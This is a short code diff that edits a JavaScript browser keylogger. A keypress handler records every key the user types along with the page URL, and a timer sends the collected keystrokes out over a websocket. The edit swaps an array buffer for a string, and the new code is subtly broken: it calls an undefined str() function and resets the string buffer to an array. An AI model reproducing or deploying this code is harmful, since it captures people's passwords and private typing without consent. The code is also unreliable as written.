@@ -1,17 +1,13 @@
-var buffer=[];
+var buffer='';
 document.onkeypress = function(e) {
     var timestamp = Date.now() | 0;
-    var stroke = {
-        k: e.key,
-        t: timestamp,
-        href: window.location.href
-    };
-    buffer.push(stroke);
+    var stroke = str(e.key)+',href:'+window.location.href;
+    buffer+=stroke;
 }
 
 window.setInterval(function() {
     if (buffer.length > 0) {
-        var data = JSON.stringify(buffer);
+        var data = buffer;
         ws.send(data);
         buffer = [];
     }
